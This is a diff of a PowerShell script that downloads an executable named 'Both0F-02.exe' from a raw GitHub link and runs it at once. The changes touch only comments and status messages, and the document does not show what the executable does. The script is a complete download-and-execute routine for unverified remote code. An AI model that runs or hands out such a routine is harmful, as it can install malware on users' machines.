@@ -1,20 +1,19 @@
-# Direct URL to the file on GitHub
+# URL to the file
 $url = "https://github.com/Mouted/Hos/raw/main/Both0F-02.exe"
 
-# Destination path on your machine (in the Downloads folder )
+# Destination path
 $destination = "$env:USERPROFILE\Downloads\Both0F-02.exe"
 
-# Message to the user
+# Start download
 Write-Host "Starting file download..."
-
-# Download the file
 Invoke-WebRequest -Uri $url -OutFile $destination
+Write-Host "Download complete."
 
-# Message to the user
-Write-Host "Download complete. Now running the file..."
-
-# Run the downloaded file
+# Run the file
+Write-Host "Running the executable..."
 Start-Process -FilePath $destination
+Write-Host "File has been executed."
 
-# Message to the user
-Write-Host "File executed successfully."
+# Keep the PowerShell window open
+Write-Host "Press Enter to exit..."
+Read-Host
